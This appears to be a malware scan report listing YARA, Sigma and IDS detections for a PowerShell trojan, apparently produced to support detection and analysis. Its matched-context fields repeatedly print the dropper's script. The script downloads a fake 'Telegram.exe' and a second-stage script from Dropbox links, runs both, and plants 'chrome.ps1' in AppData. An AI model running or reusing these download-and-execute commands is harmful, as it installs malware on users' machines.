crowdsourced_yara_results.description: This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Detects PowerShell invocation with suspicious parameters
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=$hhh = Join-Path ([System.IO.Path]::GetTempPath()) "Telegram.exe"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/slx06ol4jmjqn16icggin/.pptx?rlkey=lky2lit5lpthkcscfnz3f91oa&st=gwpkys9h&dl=0" -OutFile $hhh; & $hhh; $ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Pa [TRUNCATED]; MessageTotal=1; ScriptBlockId=d9bbe248-5a73-4677-bd30-a17360e218ff; Path=C:\Users\Bruno\Desktop\user.ps1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=$hhh = Join-Path ([System.IO.Path]::GetTempPath()) "Telegram.exe"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/slx06ol4jmjqn16icggin/.pptx?rlkey=lky2lit5lpthkcscfnz3f91oa&st=gwpkys9h&dl=0" -OutFile $hhh; & $hhh; $ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Pa [TRUNCATED]; Path=C:\Users\azure\Downloads\ce04f9074a4cc8fa74fabff5a1fe21439fd8485220321c90bb06f5dbed50170c.ps1; ScriptBlockId=62534a90-061f-495c-bd19-42dd80bb5146; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=$hhh = Join-Path ([System.IO.Path]::GetTempPath()) "Telegram.exe"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/slx06ol4jmjqn16icggin/.pptx?rlkey=lky2lit5lpthkcscfnz3f91oa&st=gwpkys9h&dl=0" -OutFile $hhh; & $hhh; $ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Pa [TRUNCATED]; MessageTotal=1; ScriptBlockId=9e1c895b-cc3f-407b-8c69-92348c474ba2; Path=C:\Users\george\Desktop\user.ps1; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code

match_context.values: @{ScriptBlockText=$hhh = Join-Path ([System.IO.Path]::GetTempPath()) "Telegram.exe"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/slx06ol4jmjqn16icggin/.pptx?rlkey=lky2lit5lpthkcscfnz3f91oa&st=gwpkys9h&dl=0" -OutFile $hhh; & $hhh; $ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Pa [TRUNCATED]; Path=C:\Users\Bruno\Desktop\user.ps1; ScriptBlockId=d9bbe248-5a73-4677-bd30-a17360e218ff; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask'
$script:ClassVersion = ''
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\ [TRUNCATED]; Path=; ScriptBlockId=7df3460a-4a9b-432c-a83f-487997766068; MessageTotal=1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=llOrEmpty()]
    [string]
    ${Argument},

    [Parameter(ParameterSetName='Exec', Position=2)]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${WorkingDirectory},

    [Parameter(ParameterSetName='Exec')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Exec')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Exec')]
    [switch]
    ${AsJob})

    Dyna [TRUNCATED]; Path=; ScriptBlockId=4fcc82e0-b5a0-4d06-af3c-ee9ccb2f4827; MessageTotal=14; MessageNumber=4; EventID=4104}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=$hhh = Join-Path ([System.IO.Path]::GetTempPath()) "Telegram.exe"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/slx06ol4jmjqn16icggin/.pptx?rlkey=lky2lit5lpthkcscfnz3f91oa&st=gwpkys9h&dl=0" -OutFile $hhh; & $hhh; $ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Pa [TRUNCATED]; MessageTotal=1; ScriptBlockId=d9bbe248-5a73-4677-bd30-a17360e218ff; Path=C:\Users\Bruno\Desktop\user.ps1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=$hhh = Join-Path ([System.IO.Path]::GetTempPath()) "Telegram.exe"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/slx06ol4jmjqn16icggin/.pptx?rlkey=lky2lit5lpthkcscfnz3f91oa&st=gwpkys9h&dl=0" -OutFile $hhh; & $hhh; $ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Pa [TRUNCATED]; Path=C:\Users\azure\Downloads\ce04f9074a4cc8fa74fabff5a1fe21439fd8485220321c90bb06f5dbed50170c.ps1; ScriptBlockId=62534a90-061f-495c-bd19-42dd80bb5146; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=$hhh = Join-Path ([System.IO.Path]::GetTempPath()) "Telegram.exe"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/slx06ol4jmjqn16icggin/.pptx?rlkey=lky2lit5lpthkcscfnz3f91oa&st=gwpkys9h&dl=0" -OutFile $hhh; & $hhh; $ppp = Join-Path ($env:AppData) "chrome.ps1"; $str = '$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Pa [TRUNCATED]; MessageTotal=1; ScriptBlockId=9e1c895b-cc3f-407b-8c69-92348c474ba2; Path=C:\Users\george\Desktop\user.ps1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=$aaa = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "https://dl.dropboxusercontent.com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force;
; MessageTotal=1; ScriptBlockId=cc8e29dd-8917-42ec-a385-5bf92fd48b87; Path=C:\Users\george\AppData\Roaming\chrome.ps1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description:
Adversaries may employ various system checks to detect and avoid virtualization and analysis environments.
This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox
Detects PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence.

match_context.values: @{Image=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Roaming\chrome.ps1; EventID=11}
@{Image=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Roaming\system_first.ps1; EventID=11}
@{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\george\AppData\Roaming\chrome.ps1; EventID=11}

sigma_analysis_results.rule_description: Get the processes that are running on the local computer.

sigma_analysis_results.rule_title: Potential PowerShell Obfuscation Using Alias Cmdlets
sigma_analysis_results.rule_description: Detects Set-Alias or New-Alias cmdlet usage. Which can be use as a mean to obfuscate PowerShell scripts

match_context.values: @{ScriptBlockText=Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=581917ff-aa67-4873-b3eb-50bf7739e9a5; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=9c680444-f34f-40f8-8993-03b65f5653ac; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; MessageTotal=1; ScriptBlockId=c992486f-05d3-4250-80b7-977a9160629c; Path=; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=0a95f5cc-6028-48cf-ad94-e4736f8eba23; MessageTotal=1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; MessageTotal=1; ScriptBlockId=a5ccbd29-4bc4-4c71-8440-138309b3a87e; Path=; MessageNumber=1; EventID=4104}

attributes.magic: Unicode text, UTF-16, little-endian text, with very long lines (1319u), with CRLF line terminators

crowdsourced_ids_results.rule_msg: ET INFO DropBox User Content Domain (dl .dropboxusercontent .com in TLS SNI)
crowdsourced_ids_results.rule_raw: alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO DropBox User Content Domain (dl .dropboxusercontent .com in TLS SNI)"; flow:established,to_server; tls.sni; content:"dl.dropboxusercontent.com"; bsize:25; fast_pattern; classtype:misc-activity; sid:2035593; rev:1; metadata:attack_target Client_Endpoint, created_at 2022_03_24, deployment Perimeter, performance_impact Low, confidence High, signature_severity Informational, updated_at 2022_03_24;)

crowdsourced_ids_results.rule_msg: ET POLICY [401TRG] DropBox Access via API (SNI)
crowdsourced_ids_results.rule_raw: alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET POLICY [401TRG] DropBox Access via API (SNI)"; flow:established,to_server; tls.sni; content:"content.dropboxapi.com"; nocase; reference:url,github.com/dropbox/dbxcli; classtype:policy-violation; sid:2030702; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2020_08_19, deployment Perimeter, confidence High, signature_severity Informational, updated_at 2020_08_19;)
